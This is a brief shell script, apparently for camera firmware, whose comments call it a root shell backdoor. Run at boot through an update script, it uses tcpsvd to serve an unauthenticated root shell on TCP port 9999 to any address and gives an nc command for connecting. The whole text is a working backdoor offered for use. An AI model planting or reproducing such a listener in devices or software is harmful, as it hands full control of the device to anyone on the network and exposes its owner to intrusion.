#!/bin/sh
# Root shell backdoor -- runs once at boot via /progs/updateID.sh
# Starts an unauthenticated root shell on TCP port 9999.
# Connect with: nc <camera-ip> 9999
tcpsvd 0.0.0.0 9999 /bin/sh -il &
